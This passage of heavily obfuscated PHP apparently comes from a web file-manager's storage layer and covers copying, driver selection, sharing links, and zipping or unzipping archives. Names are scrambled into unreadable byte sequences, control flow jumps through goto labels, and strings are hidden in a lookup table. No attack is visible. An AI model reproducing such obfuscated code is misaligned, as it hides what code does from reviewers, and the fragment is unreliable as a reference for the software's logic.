$Aä®µÊõ¡, $B’ÈéÅ«Äİ[76] => $A³ö‘À²÷); goto A¦¹˜™”Ô’; fğ¸¼Á²¡¶: $D“‚ óÏñÕ = self::_listAll($F¨±øß¥Š); $F¥ÆÄ…Œ½ = self::_listAll($b•èĞìŞï); $Aä®µÊõ¡ = array(); goto Bğ›„—÷ˆø; A¦¹˜™”Ô’: Hook::trigger($B’ÈéÅ«Äİ[1008], $F¨±øß¥Š, $b•èĞìŞï, $D¹ò—ñÃ); foreach ($A³ö‘À²÷ as $eÚÉ¹ÇŒç) { IO::mkdir($eÚÉ¹ÇŒç); } foreach ($Aä®µÊõ¡ as $eÚÉ¹ÇŒç) { IO::copy($eÚÉ¹ÇŒç[$B’ÈéÅ«Äİ[1005]], $eÚÉ¹ÇŒç[$B’ÈéÅ«Äİ[1006]], REPEAT_REPLACE); } goto cƒÕ¾Ê•ğ; cƒÕ¾Ê•ğ: } private static function _listAll($eê„âæªğ) { $b„­÷¾óÅö =& $_SERVER[Å¸ş]; $eê„âæªğ = KodIO::clear($eê„âæªğ); $bñÌ•Ó‘Êè = IO::listAll($eê„âæªğ); foreach ($bñÌ•Ó‘Êè as &$d‡ŒË»ĞÊß) { $c£ø¹¤ºË = substr($d‡ŒË»ĞÊß[$b„­÷¾óÅö[75]], strlen($eê„âæªğ)); $d‡ŒË»ĞÊß[$b„­÷¾óÅö[1009]] = trim($c£ø¹¤ºË, $b„­÷¾óÅö[8]); } unset($d‡ŒË»ĞÊß); return array_to_keyvalue($bñÌ•Ó‘Êè, $b„­÷¾óÅö[1009]); } public static function fileSubstr($a¯†ÚøÙÖ’, $f—¬ç¹òßë, $bÃƒÀ½Ô† = false) { goto C‡Ú™øÌÂ¤; FÜ´¬ŞÉÈÜ: $b«·øÌ¾àî = $bÃƒÀ½Ô†; if ($f—¬ç¹òßë < 0) { $f—¬ç¹òßë = $EÄøµ¹°éï + $f—¬ç¹òßë; } if ($bÃƒÀ½Ô† === !1) { $bÃƒÀ½Ô† = $EÄøµ¹°éï - $f—¬ç¹òßë; } goto fæ¦ê¾Ô´; C‡Ú™øÌÂ¤: $aËº‰  ã = self::driverMake($a¯†ÚøÙÖ’); $EÄøµ¹°éï = $aËº‰  ã->size($a¯†ÚøÙÖ’); $C•¿‰¬¶Úò = $f—¬ç¹òßë; goto FÜ´¬ŞÉÈÜ; FóšŒ…œÆ‡: return $aËº‰  ã->fileSubstr($a¯†ÚøÙÖ’, $f—¬ç¹òßë, $bÃƒÀ½Ô†); goto Dô¡¤éÀ’§; fæ¦ê¾Ô´: if ($f—¬ç¹òßë + $bÃƒÀ½Ô† > $EÄøµ¹°éï) { $bÃƒÀ½Ô† = $EÄøµ¹°éï - $f—¬ç¹òßë; } if ($bÃƒÀ½Ô† <= 0) { return $_SERVER[Å¸ş][33]; } if ($f—¬ç¹òßë < 0 || $f—¬ç¹òßë >= $EÄøµ¹°éï || $bÃƒÀ½Ô† > 1024 * 1024 * 5) { throw new Exception("\x66\x69\154\x65\122\x65\141\x64\x20\x65\162\162\157\x72\41\x20\163\164\141\162\164\75{$f—¬ç¹òßë}\73\154\145\x6e\147\x74\x68\75{$bÃƒÀ½Ô†}\x3b\x20\163\x69\172\145\x3d{$EÄøµ¹°éï}\x3b"); } goto FóšŒ…œÆ‡; Dô¡¤éÀ’§: } private static function driverMake(&$A³¬¯®Ñ†) { goto dë´Î‡†´É; f÷åÏØåÁÏ: return $eÛ¼µ¸¦×î; goto eÄ¨ø”Çºğ; dë´Î‡†´É: $e¥±†ãï…£ =& $_SERVER[Å¸ş]; $c„ŠĞ¥ÜÎ = KodIO::parse($A³¬¯®Ñ†); if (!self::$driverListSystem) { $bí…ß’†‡Õ = Model($e¥±†ãï…£[706])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($bí…ß’†‡Õ, $e¥±†ãï…£[367]); } goto dÙæ•«Ş¿ø; dÙæ•«Ş¿ø: if ($c„ŠĞ¥ÜÎ[$e¥±†ãï…£[29]] == KodIO::KOD_IO && !self::$driverListSystem[$c„ŠĞ¥ÜÎ[$e¥±†ãï…£[367]]]) { return !1; } $A³¬¯®Ñ† = $c„ŠĞ¥ÜÎ[$e¥±†ãï…£[1010]]; $eÛ¼µ¸¦×î = self::driverGet($c„ŠĞ¥ÜÎ, $A³¬¯®Ñ†); goto f÷åÏØåÁÏ; eÄ¨ø”Çºğ: } private static function driverGet($aŒö¬ŒÅìš, &$b”§Â§íŞ§) { goto C÷Şƒ”Ÿ„”; fÂ¡¡¿Ü÷½: $BÈŸ›æàÍ´->path = $b”§Â§íŞ§; return $BÈŸ›æàÍ´; goto eŒ¨ØÓ‚Şò; d‰„ŞÙŞ´‹: $BÈŸ›æàÍ´ = self::$driverCache[$dÆ¹—¢™ƒì]; $BÈŸ›æàÍ´->pathDriver = $b×¸£Í; $BÈŸ›æàÍ´->pathBase = $dëÇ¹’ì¨‡[33]; goto cñ¶õĞŠ³¡; cñ¶õĞŠ³¡: if (isset($BåìÉ£éƒï[$dëÇ¹’ì¨‡[6]][$dëÇ¹’ì¨‡[1022]])) { $BÈŸ›æàÍ´->pathBase = rtrim($BåìÉ£éƒï[$dëÇ¹’ì¨‡[6]][$dëÇ¹’ì¨‡[1022]], $dëÇ¹’ì¨‡[8]) . $dëÇ¹’ì¨‡[8]; $b”§Â§íŞ§ = $BÈŸ›æàÍ´->pathBase . ltrim($b”§Â§íŞ§, $dëÇ¹’ì¨‡[8]); } $b”§Â§íŞ§ = $BÈŸ›æàÍ´->getPath($b”§Â§íŞ§); if (isset($aŒö¬ŒÅìš[$dëÇ¹’ì¨‡[996]])) { $b”§Â§íŞ§ = $aŒö¬ŒÅìš[$dëÇ¹’ì¨‡[996]]; } goto fÂ¡¡¿Ü÷½; C÷Şƒ”Ÿ„”: $dëÇ¹’ì¨‡ =& $_SERVER[Å¸ş]; $b×¸£Í = $aŒö¬ŒÅìš[$dëÇ¹’ì¨‡[1011]]; $cãù§×–º¾ = $aŒö¬ŒÅìš[$dëÇ¹’ì¨‡[367]]; goto C™™‚ğî‡; C™™‚ğî‡: switch ($aŒö¬ŒÅìš[$dëÇ¹’ì¨‡[29]]) { case KodIO::KOD_IO: $BåìÉ£éƒï = self::$driverListSystem[$cãù§×–º¾]; break; case KodIO::KOD_SOURCE: $b”§Â§íŞ§ = $cãù§×–º¾ . $b”§Â§íŞ§; $BåìÉ£éƒï = array($dëÇ¹’ì¨‡[1012] => $dëÇ¹’ì¨‡[1013], $dëÇ¹’ì¨‡[6] => $aŒö¬ŒÅìš); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $fªÕƒ‹¹ = $GLOBALS[$dëÇ¹’ì¨‡[1014]]; self::$driverListUser = array_to_keyvalue($fªÕƒ‹¹, $dëÇ¹’ì¨‡[367]); } $BåìÉ£éƒï = self::$driverListUser[$cãù§×–º¾]; break; case KodIO::KOD_SHARE_LINK: $BåìÉ£éƒï = array($dëÇ¹’ì¨‡[1012] => $dëÇ¹’ì¨‡[1015], $dëÇ¹’ì¨‡[6] => $aŒö¬ŒÅìš); $cšµ‡Ãóµº = Action($dëÇ¹’ì¨‡[1016])->sharePathInfo($aŒö¬ŒÅìš[$dëÇ¹’ì¨‡[75]]); $b”§Â§íŞ§ = $cšµ‡Ãóµº[$dëÇ¹’ì¨‡[369]]; if (!$cšµ‡Ãóµº[$dëÇ¹’ì¨‡[369]]) { $cÌ»½ÖÜÁ° = Model($dëÇ¹’ì¨‡[538])->getInfo($cšµ‡Ãóµº[$dëÇ¹’ì¨‡[441]]); $b”§Â§íŞ§ = KodIO::clear($cÌ»½ÖÜÁ°[$dëÇ¹’ì¨‡[1017]] . $aŒö¬ŒÅìš[$dëÇ¹’ì¨‡[1010]]); $aŒö¬ŒÅìš[$dëÇ¹’ì¨‡[439]] = $cÌ»½ÖÜÁ°; $aŒö¬ŒÅìš[$dëÇ¹’ì¨‡[996]] = $b”§Â§íŞ§; $BåìÉ£éƒï = array($dëÇ¹’ì¨‡[1012] => $dëÇ¹’ì¨‡[1018], $dëÇ¹’ì¨‡[6] => $aŒö¬ŒÅìš); } break; case KodIO::KOD_SHARE_ITEM: $BåìÉ£éƒï = array($dëÇ¹’ì¨‡[1012] => $dëÇ¹’ì¨‡[1019], $dëÇ¹’ì¨‡[6] => $aŒö¬ŒÅìš); $cÌ»½ÖÜÁ° = Model($dëÇ¹’ì¨‡[538])->getInfo($aŒö¬ŒÅìš[$dëÇ¹’ì¨‡[367]]); if ($cÌ»½ÖÜÁ°[$dëÇ¹’ì¨‡[369]] == $dëÇ¹’ì¨‡[470]) { $b”§Â§íŞ§ = KodIO::clear($cÌ»½ÖÜÁ°[$dëÇ¹’ì¨‡[1017]] . $aŒö¬ŒÅìš[$dëÇ¹’ì¨‡[1010]]); $aŒö¬ŒÅìš[$dëÇ¹’ì¨‡[439]] = $cÌ»½ÖÜÁ°; $aŒö¬ŒÅìš[$dëÇ¹’ì¨‡[996]] = $b”§Â§íŞ§; $BåìÉ£éƒï = array($dëÇ¹’ì¨‡[1012] => $dëÇ¹’ì¨‡[1020], $dëÇ¹’ì¨‡[6] => $aŒö¬ŒÅìš); } else { if (!$b”§Â§íŞ§) { $b”§Â§íŞ§ = $cÌ»½ÖÜÁ°[$dëÇ¹’ì¨‡[369]]; } } break; default: $b”§Â§íŞ§ = $aŒö¬ŒÅìš[$dëÇ¹’ì¨‡[75]]; $BåìÉ£éƒï = array($dëÇ¹’ì¨‡[1012] => $dëÇ¹’ì¨‡[1021]); break; } $dÆ¹—¢™ƒì = $aŒö¬ŒÅìš[$dëÇ¹’ì¨‡[75]]; if (!isset(self::$driverCache[$dÆ¹—¢™ƒì])) { $e§Œ†½’ = strtolower($BåìÉ£éƒï[$dëÇ¹’ì¨‡[90]]); $d§ƒ²î¯²ñ = $GLOBALS[$dëÇ¹’ì¨‡[6]][$dëÇ¹’ì¨‡[84]][$dëÇ¹’ì¨‡[756]]; $BØ‹ÌÏËÏ× = $dëÇ¹’ì¨‡[71] . (isset($d§ƒ²î¯²ñ[$e§Œ†½’]) ? $d§ƒ²î¯²ñ[$e§Œ†½’] : ucfirst($e§Œ†½’)); if (!class_exists($BØ‹ÌÏËÏ×)) { show_json("{$BØ‹ÌÏËÏ×}\40\x6e\157\164\x20\145\x78\151\163\164\163\x21", !1); } $fµŒ‚Ñì = isset($BåìÉ£éƒï[$dëÇ¹’ì¨‡[6]]) ? $BåìÉ£éƒï[$dëÇ¹’ì¨‡[6]] : !1; self::$driverCache[$dÆ¹—¢™ƒì] = new $BØ‹ÌÏËÏ×($fµŒ‚Ñì); } goto d‰„ŞÙŞ´‹; eŒ¨ØÓ‚Şò: } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $b—ˆ«Ú›ó; if (!$b—ˆ«Ú›ó) { $CßÊ®†¦Ë© = IO::init($_SERVER[Å¸ş][8]); } return $CßÊ®†¦Ë©; } private static function iconvSystem($E±è•ù¯­Î) { return self::local()->iconvSystem($E±è•ù¯­Î); } private static function iconvApp($CóåÀËÆó¦) { return self::local()->iconvApp($CóåÀËÆó¦); } public static function zip($D”‘›®Â, $Fõ”Ğ®åİ = "\172\x69\160", $b‚İŒî‹…„ = '', $FæÓÚ£‚ = REPEAT_RENAME) { goto B‡¤İ—È; B‡¤İ—È: $a›ñªÎ»„Ş =& $_SERVER[Å¸ş]; $cÆ‹Â‚ÌÒ = self::init($D”‘›®Â[0][$a›ñªÎ»„Ş[75]]); $A¯øªŒ®§ = self::info($D”‘›®Â[0][$a›ñªÎ»„Ş[75]]); goto fƒçÑ”ë ¢; Eéõ£›êÀ: if (count($Fâ‰‘äÕÈë) > 1) { $c÷¥×¹æ£‚ = IO::info(IO::pathFather($A¯øªŒ®§[$a›ñªÎ»„Ş[75]])); $AöÏ‡‚Š„¯ = $c÷¥×¹æ£‚[$a›ñªÎ»„Ş[28]]; } $A”ñÉÚãë‘ = $BŠŠœ½ÕÛá; if (!$A”ñÉÚãë‘) { $A”ñÉÚãë‘ = get_path_father($A¯øªŒ®§[$a›ñªÎ»„Ş[75]]); if (!$b‚İŒî‹…„ && $cÆ‹Â‚ÌÒ->getType() == $a›ñªÎ»„Ş[102]) { $A”ñÉÚãë‘ = get_path_father($cÆ‹Â‚ÌÒ->path); } $f¹í¸±Ã× = IO::info($A”ñÉÚãë‘); if (!$f¹í¸±Ã×[$a›ñªÎ»„Ş[189]]) { show_json(LNG($a›ñªÎ»„Ş[1024]), !1); } } goto C†°´—õÅÌ; e‡ÌŸŒŒÓ: if (!$dŠÙÒâÙ®) { del_dir($BŠŠœ½ÕÛá); show_json(LNG($a›ñªÎ»„Ş[1025]), !1); } del_dir($BŠŠœ½ÕÛá); return $dŠÙÒâÙ®; goto fÏ½Ë¦Î¥İ; A‡ì¸‡å½Û: if ($b‚İŒî‹…„ || !$BŠŠœ½ÕÛá) { if ($BŠŠœ½ÕÛá && strstr($BŠŠœ½ÕÛá, TEMP_FILES)) { $b¾çæ¬®Ûé = $Fâ‰‘äÕÈë = array(); recursion_dir($A”ñÉÚãë‘, $b¾çæ¬®Ûé, $Fâ‰‘äÕÈë, 0); foreach ($b¾çæ¬®Ûé as $aÎÚŒí¬¶ğ) { del_dir($aÎÚŒí¬¶ğ); } foreach ($Fâ‰‘äÕÈë as $f‚ƒá¹ÆÑ‰) { if ($f‚ƒá¹ÆÑ‰ == $CÊÉÜ¸ùà) { continue; } del_file($f‚ƒá¹ÆÑ‰); } } return $F¶ºòÌøÕ; } $f¦Àæ×–‹ = self::pathFather($A¯øªŒ®§[$a›ñªÎ»„Ş[75]]); $dŠÙÒâÙ® = self::move($F¶ºòÌøÕ, $f¦Àæ×–‹, $FæÓÚ£‚); goto e‡ÌŸŒŒÓ; fƒçÑ”ë ¢: $BŠŠœ½ÕÛá = !1; if (!$b‚İŒî‹…„ && $cÆ‹Â‚ÌÒ->getType() == $a›ñªÎ»„Ş[102]) { $Fâ‰‘äÕÈë = self::zipFileList($D”‘›®Â); } else { $BŠŠœ½ÕÛá = $b‚İŒî‹…„ ? $b‚İŒî‹…„ : TEMP_FILES . $a›ñªÎ»„Ş[1023] . time() . rand_string(8) . $a›ñªÎ»„Ş[8]; mk_dir($BŠŠœ½ÕÛá); $Fâ‰‘äÕÈë = self::zipFileList($D”‘›®Â, $BŠŠœ½ÕÛá); } $AöÏ‡‚Š„¯ = $A¯øªŒ®§[$a›ñªÎ»„Ş[28]]; goto Eéõ£›êÀ; Dæ‘ùŒá½: foreach ($Fâ‰‘äÕÈë as $D İÒ»Îô³ => $eˆ¦Ş‰ƒË) { $Fâ‰‘äÕÈë[$D İÒ»Îô³] = self::iconvSystem($eˆ¦Ş‰ƒË); } KodArchive::create($CÊÉÜ¸ùà, $Fâ‰‘äÕÈë); if (!IO::exist($F¶ºòÌøÕ)) { if ($BŠŠœ½ÕÛá) { del_dir($BŠŠœ½ÕÛá); } show_json(LNG($a›ñªÎ»„Ş[1025]), !1); } goto A‡ì¸‡å½Û; C†°´—õÅÌ: $F¶ºòÌøÕ = $A”ñÉÚãë‘ . $AöÏ‡‚Š„¯ . $a›ñªÎ»„Ş[91] . $Fõ”Ğ®åİ; $F¶ºòÌøÕ = get_filename_auto($F¶ºòÌøÕ, $a›ñªÎ»„Ş[33], $FæÓÚ£‚); $CÊÉÜ¸ùà = self::iconvSystem($F¶ºòÌøÕ); goto Dæ‘ùŒá½; fÏ½Ë¦Î¥İ: } public static function unzip($b‚ÒÃêóÑà, $a†äÊ¶ß†— = "\x72\145\x70\x6c\x61\143\145") { goto B‚ô¾†šŞä; Fœì ŞÅ™: foreach ($eÏ¤ØÜ‡³Â as $Aè¿Œ×÷´) { $Aè¿Œ×÷´ = self::iconvApp($Aè¿Œ×÷´); self::move($Aè¿Œ×÷´, $Fò‚¦‚´†Õ, $a†äÊ¶ß†—); } del_dir($Eºõˆ ); if (!$ağöÉ¨ëÇ) { del_file($BîÑ©õîƒø); } goto cîå…àà‘Ô; C–ô‚†áÛ˜: $F¬„øÎÊÇ = self::tmpFileName($bŸáƒÂİ°); $Eºõˆ  = TEMP_FILES . $F¬„øÎÊÇ; del_dir($Eºõˆ ); goto fï† Š¤„¢; c“ªââãã²: Hook::trigger($EÆ¼šŠ»Ÿ[1033], $Eºõˆ ); recursion_dir($Eºõˆ , $b®”Ç³ÚÖ·, $fÕŞº¢‰õ, 0); $eÏ¤ØÜ‡³Â = array_merge($b®”Ç³ÚÖ·, $fÕŞº¢‰õ); goto Fœì ŞÅ™; fï† Š¤„¢: mk_dir($Eºõˆ ); $EÕø’½Ô‰Å = self::fileExt($bŸáƒÂİ°); $BîÑ©õîƒø = $Eºõˆ  . $EÆ¼šŠ»Ÿ[91] . $EÕø’½Ô‰Å; goto eĞ»”óêƒ; eĞ»”óêƒ: if (!@file_exists(self::iconvSystem($BîÑ©õîƒø))) { $ağöÉ¨ëÇ = self::localFilePath($D÷Š°çÚï•, $EÕø’½Ô‰Å); $BîÑ©õîƒø = $ağöÉ¨ëÇ ? $ağöÉ¨ëÇ : parent::download($D÷Š°çÚï•, $BîÑ©õîƒø); } $BîÑ©õîƒø = self::iconvSystem($BîÑ©õîƒø); $A‚¾ê‡ƒ¤… = isset($b‚ÒÃêóÑà[$EÆ¼šŠ»Ÿ[1028]]) ? $b‚ÒÃêóÑà[$EÆ¼šŠ»Ÿ[1028]] : $EÆ¼šŠ»Ÿ[1029]; goto D ¸÷º«Œœ; B‚ô¾†šŞä: $EÆ¼šŠ»Ÿ =& $_SERVER[Å¸ş]; $D÷Š°çÚï• = $b‚ÒÃêóÑà[$EÆ¼šŠ»Ÿ[75]]; $Fò‚¦‚´†Õ = $b‚ÒÃêóÑà[$EÆ¼šŠ»Ÿ[1026]]; goto fê–’ØË¯Ú; cîå…àà‘Ô: return !0; goto eŸêŞ‹£ŸÌ; D ¸÷º«Œœ: $CÃÅ×™Ë”” = KodArchive::extract($BîÑ©õîƒø, $Eºõˆ  . $EÆ¼šŠ»Ÿ[8], $A‚¾ê‡ƒ¤…); self::archiveExt(); if (!$CÃÅ×™Ë””[$EÆ¼šŠ»Ÿ[1030]]) { show_json($EÆ¼šŠ»Ÿ[1031] . $CÃÅ×™Ë””[$EÆ¼šŠ»Ÿ[1032]], !1); } goto c“ªââãã²; fê–’ØË¯Ú: if (!($bŸáƒÂİ° = parent::info($D÷Š°çÚï•))) { show_json(LNG($EÆ¼šŠ»Ÿ[1027]), !1); } if (!($d†ìËö»¤Ø = parent::infoFull($Fò‚¦‚´†Õ))) { $Fò‚¦‚´†Õ = parent::mkdir($Fò‚¦‚´†Õ); $d†ìËö»¤Ø = array($EÆ¼šŠ»Ÿ[75] => $Fò‚¦‚´†Õ); } else { if (isset($d†ìËö»¤Ø[$EÆ¼šŠ»Ÿ[369]]) && trim($d†ìËö»¤Ø[$EÆ¼šŠ»Ÿ[75]], $EÆ¼šŠ»Ÿ[8]) != trim($Fò‚¦‚´†Õ, $EÆ¼šŠ»Ÿ[8])) { $b›Š‹„Ş×‘ = KodIO::make($d†ìËö»¤Ø[$EÆ¼šŠ»Ÿ[463]]); $Eã¶ºÊÜ = parent::fileNameAuto($b›Š‹„Ş×‘, $d†ìËö»¤Ø[$EÆ¼šŠ»Ÿ[28]], REPEAT_RENAME_FOLDER, !0); $Fò‚¦‚´†Õ = parent::mkdir($b›Š‹„Ş×‘ . $Eã¶ºÊÜ); $d†ìËö»¤Ø = array($EÆ¼šŠ»Ÿ[75] => $Fò‚¦‚´†Õ); } } $Fò‚¦‚´†Õ = $d†ìËö»¤Ø[$EÆ¼šŠ»Ÿ[75]]; goto C–ô‚†áÛ˜; eŸêŞ‹£ŸÌ: } public static function unzipList($CÒáï¿çÇ) { goto b‰´ñ‰ğ¶ª; e…»À­Æ: if (!is_dir($Aç†¶é§ƒ)) { mk_dir($Aç†¶é§ƒ); } $Aë£¹õœ = $Aç†¶é§ƒ . $C«ñ‹ÓÅÑ[8] . $D‰»ßô‡ÊÆ; if (!@file_exists(self::iconvSystem($Aë£¹õœ))) { if (isset($dñã ¤Ìì)) { url_request($c™âßí˜¸Ä, $C«ñ‹ÓÅÑ[1037], $Aë£¹õœ); } else { $F™¼õÉ ½¹ = self::localFilePath($c™âßí˜¸Ä, $báÒí¯çƒ); $Aë£¹õœ = $F™¼õÉ ½¹ ? $F™¼õÉ ½¹ : self::download($c™âßí˜¸Ä, $Aë£¹õœ); } } goto D»òá“î; DË¼ä•÷ÕŞ: $DÆÖÌËµç» = json_encode($Bá¨‡®ç[$C«ñ‹ÓÅÑ[1032]]); self::setContent($D…‘¸ïÚŠ­, $DÆÖÌËµç»); if (count($Bá¨‡®ç[$C«ñ‹ÓÅÑ[1032]]) >= $CÔèŠãê²¯) { show_json(sprintf(LNG($C«ñ‹ÓÅÑ[1036]), count($Bá¨‡®ç[$C«ñ‹ÓÅÑ[1032]])), !1); } goto c©Ûº¹×‚ä; b†¹Šß–ŞÃ: if (isset($dñã ¤Ìì)) { $A ‡‡²ôµ‹ = array($dñã ¤Ìì[$C«ñ‹ÓÅÑ[75]], $dñã ¤Ìì[$C«ñ‹ÓÅÑ[1034]], $dñã ¤Ìì[$C«ñ‹ÓÅÑ[28]]); $D‰»ßô‡ÊÆ = md5(implode($C«ñ‹ÓÅÑ[70], $A ‡‡²ôµ‹)) . $C«ñ‹ÓÅÑ[91] . get_path_ext($dñã ¤Ìì[$C«ñ‹ÓÅÑ[28]]); } else { $A ‡‡²ôµ‹ = array($b°ÈæÙ˜ã[$C«ñ‹ÓÅÑ[28]], $b°ÈæÙ˜ã[$C«ñ‹ÓÅÑ[75]], $b°ÈæÙ˜ã[$C«ñ‹ÓÅÑ[77]]); $D‰»ßô‡ÊÆ = md5(implode($C«ñ‹ÓÅÑ[70], $A ‡‡²ôµ‹)) . $C«ñ‹ÓÅÑ[91] . $báÒí¯çƒ; } if ($a°Ò½¸ñ‡¬ == -1) { $D…‘¸ïÚŠ­ = IO_PATH_SYSTEM_TEMP . "\x7a\151\x70\x56\151\145\167\x2f{$D½ÏáàÇÚí}\57{$D‰»ßô‡ÊÆ}\56\154\x6f\147"; $dì“Ã¿ºÅ = self::infoFull($D…‘¸ïÚŠ­); if ($dì“Ã¿ºÅ) { $D…‘¸ïÚŠ­ = $dì“Ã¿ºÅ[$C«ñ‹ÓÅÑ[75]]; $d‡æ ˜¿Ä‚ = self::getContent($D…‘¸ïÚŠ­); if ($d‡æ ˜¿Ä‚) { $DÆÖÌËµç» = json_decode($d‡æ ˜¿Ä‚, !0); if (count($DÆÖÌËµç») >= $CÔèŠãê²¯) { show_json(sprintf(LNG($C«ñ‹ÓÅÑ[1036]), count($DÆÖÌËµç»)), !1); } return $DÆÖÌËµç»; } } else { $D…‘¸ïÚŠ­ = self::mkfile($D…‘¸ïÚŠ­); } } $Aç†¶é§ƒ = TEMP_FILES . $D½ÏáàÇÚí; goto e…»À­Æ; c©Ûº¹×‚ä: return $Bá¨‡®ç[$C«ñ‹ÓÅÑ[1032]]; goto b¼Ñƒùš¦; b‰´ñ‰ğ¶ª: $C«ñ‹ÓÅÑ =& $_SERVER[Å¸ş]; $c™âßí˜¸Ä = $CÒáï¿çÇ[$C«ñ‹ÓÅÑ[75]]; $a°Ò½¸ñ‡¬ = isset($CÒáï¿çÇ[$C«ñ‹ÓÅÑ[1034]]) ? $CÒáï¿çÇ[$C«ñ‹ÓÅÑ[1034]] : -1; goto F‡‡Ü‰Ù¤§; D»òá“î: $Aë£¹õœ = self::iconvSystem($Aë£¹õœ); if ($a°Ò½¸ñ‡¬ >= 0) { $Bâ¼ Ê £“ = isset($CÒáï¿çÇ[$C«ñ‹ÓÅÑ[1038]]) ? $CÒáï¿çÇ[$C«ñ‹ÓÅÑ[1038]] : !1; $Déëõ†Â‡ = isset($CÒáï¿çÇ[$C«ñ‹ÓÅÑ[28]]) ? $CÒáï¿çÇ[$C«ñ‹ÓÅÑ[28]] : $C«ñ‹ÓÅÑ[33]; KodArchive::filePreview($Aë£¹õœ, $a°Ò½¸ñ‡¬, $Bâ¼ Ê £“, $Déëõ†Â‡); self::archiveExt(); die; } $Bá¨‡®ç = KodArchive::listContent($Aë£¹õœ); goto D˜ïíƒÇÔß; D˜ïíƒÇÔß: self::archiveExt(); del_dir($Aç†¶é§ƒ); if (!$Bá¨‡®ç[$C«ñ‹ÓÅÑ[1030]]) { show_json($Bá¨‡®ç[$C«ñ‹ÓÅÑ[1032]], !1); } goto DË¼ä•÷ÕŞ; cÄ¿ˆ¯ÏÃŸ: $b°ÈæÙ˜ã = self::info($BÑÖ¨£áá); $báÒí¯çƒ = self::fileExt($b°ÈæÙ˜ã); $D½ÏáàÇÚí = self::tmpFileName($b°ÈæÙ˜ã); goto b†¹Šß–ŞÃ; F‡‡Ü‰Ù¤§: $CÔèŠãê²¯ = 50000; if (request_url_safe($c™âßí˜¸Ä)) { $dñã ¤Ìì = parse_url_query($c™âßí˜¸Ä); if (!isset($dñã ¤Ìì[$C«ñ‹ÓÅÑ[75]])) { show_json($C«ñ‹ÓÅÑ[1035], !1); } } $BÑÖ¨£áá = isset($dñã ¤Ìì) ? $dñã ¤Ìì[$C«ñ‹ÓÅÑ[75]] : $c™âßí˜¸Ä; goto cÄ¿ˆ¯ÏÃŸ; b¼Ñƒùš¦: } private static function fileExt($Fö¯ò±¿´ˆ) { $b˜¤¸ƒÚäÏ =& $_SERVER[Å¸ş]; $e‚à‰……éÆ = $Fö¯ò±¿´ˆ[$b˜¤¸ƒÚäÏ[160]]; if ($e‚à‰……éÆ == $b˜¤¸ƒÚäÏ[1039]) { $DÖÄÁ›ê„§ = $b˜¤¸ƒÚäÏ[1040]; if (substr($Fö¯ò±¿´ˆ[$b˜¤¸ƒÚäÏ[28]], -strlen($DÖÄÁ›ê„§)) == $DÖÄÁ›ê„§) { $e‚à‰……éÆ = $b˜¤¸ƒÚäÏ[1041]; } } self::archiveExt($e‚à‰……éÆ); return $e‚à‰……éÆ; } private static function zipFileList($B¡¯ğ­ ö, $FëĞõùïç = false) { $BÍ³…Ùâãè =& $_SERVER[Å¸ş]; $AŠñõÄĞí¨ = array(); foreach ($B¡¯ğ­ ö as $ağò‹Ôİ¸) { $B·„‡å²ƒ = $ağò‹Ôİ¸[$BÍ³…Ùâãè[75]]; if ($FëĞõùïç) { $B·„‡å²ƒ = self::copy($ağò‹Ôİ¸[$BÍ³…Ùâãè[75]], $FëĞõùïç, $BÍ³…Ùâãè[747]); } else { $C‚ğÁ”Š  = self::init($ağò‹Ôİ¸[$BÍ³…Ùâãè[75]]); if ($C‚ğÁ”Š ->getType() == $BÍ³…Ùâãè[102]) { $B·„‡å²ƒ = $C‚ğÁ”Š ->path; } } if ($B·„‡å²ƒ && self::local()->exist($B·„‡å²ƒ)) { $AŠñõÄĞí¨[$ağò‹Ôİ¸[$BÍ³…Ùâãè[75]]] = $B·„‡å²ƒ; } } if (!empty($AŠñõÄĞí¨)) { return array_values($AŠñõÄĞí¨); } show_json(LNG($BÍ³…Ùâãè[1042]), !1); } public static function tmpFileName($EÔã£™·µù) { $Fİƒî¶ğ›‰ =& $_SERVER[Å¸ş]; $D³‚¥¡‡îÉ = array($EÔã£™·µù[$Fİƒî¶ğ›‰[28]], $EÔã£™·µù[$Fİƒî¶ğ›‰[75]], $EÔã£™·µù[$Fİƒî¶ğ›‰[77]], $EÔã£™·µù[$Fİƒî¶ğ›‰[461]]); return md5(implode($Fİƒî¶ğ›‰[70], $D³‚¥¡‡îÉ)); } private static function localFilePath($b£Œ‘…÷¨, $D¸Ê…îøØ‡) { goto c¶›˜•øƒ¢; c¶›˜•øƒ¢: $aÉ‰£ƒÜ =& $_SERVER[Å¸ş]; if ($D¸Ê…îøØ‡ == $aÉ‰£ƒÜ[1043] && strtoupper(substr(PHP_OS, 0, 3)) == $aÉ‰£ƒÜ[1044]) { return !1; } $bº‡¾ŞàÊ = KodIO::parse($b£Œ‘…÷¨); goto CÆÆÍÖˆ¾Ø; cò¤éöØºÁ: if ($céÎÂê¢ìì == $aÉ‰£ƒÜ[102] || $céÎÂê¢ìì == $aÉ‰£ƒÜ[1046]) { if (!$aÓ§§÷ÃĞ¤->exist($aÓ§§÷ÃĞ¤->path)) { show_json(LNG($aÉ‰£ƒÜ[101]), !1); } return $aÓ§§÷ÃĞ¤->path; } return !1; goto dÈì÷‚Üê¦; CÆÆÍÖˆ¾Ø: if ($bº‡¾ŞàÊ[$aÉ‰£ƒÜ[29]] == KodIO::KOD_SOURCE) { $EÅä»ñ‰­ï = Model($aÉ‰£ƒÜ[755])->fileInfoGet(KodIO::sourceID($b£Œ‘…÷¨)); if (!$EÅä»ñ‰­ï[$aÉ‰£ƒÜ[75]]) { show_json($aÉ‰£ƒÜ[1045], !1); } $b£Œ‘…÷¨ = $EÅä»ñ‰­ï[$aÉ‰£ƒÜ[75]]; } $aÓ§§÷ÃĞ¤ = self::init($b£Œ‘…÷¨); $céÎÂê¢ìì = $aÓ§§÷ÃĞ¤->getType(); goto cò¤éöØºÁ; dÈì÷‚Üê¦: } private static function archiveExt($b÷¼àŞ­Ï© = '') { $GLOBALS[$_SERVER[Å¸ş][1047]] = $b÷¼àŞ­Ï©; } } goto eôó‡ŒÛÃî; A¼ºÔòÁ: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\137\146\x61\166"; protected function cacheFunctionAlias($E £îĞì×) { $Dˆğš«š¤ =& $_SERVER[Å¸ş]; return array($Dˆğš«š¤[2204] => array(USER_ID, $Dˆğš«š¤[2205])); } protected function listData() { $aã¬×ëçÉù =& $_SERVER[Å¸ş]; $c†„Ë¤®÷ = array($aã¬×ëçÉù[1427] => USER_ID, 